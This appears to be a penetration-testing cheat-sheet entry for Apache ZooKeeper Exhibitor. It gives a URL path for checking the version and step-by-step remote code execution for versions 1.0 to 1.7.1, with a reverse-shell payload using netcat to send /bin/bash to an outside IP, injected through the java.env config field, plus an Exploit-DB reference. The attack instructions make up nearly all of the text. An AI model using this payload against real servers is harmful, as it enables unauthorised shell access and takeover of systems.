# zookeeper exhibitor

## version check

```
- /exhibitor/v1/ui/index.html
```

## Exhibitor Web RCE

v1.0 | 1.7.1

```
# Under Config tab > Editing: ON
# add to java.env script: $(nc -e /bin/bash 192.168.49.99 445 &)
# Commit > All at once

https://www.exploit-db.com/exploits/48654
```
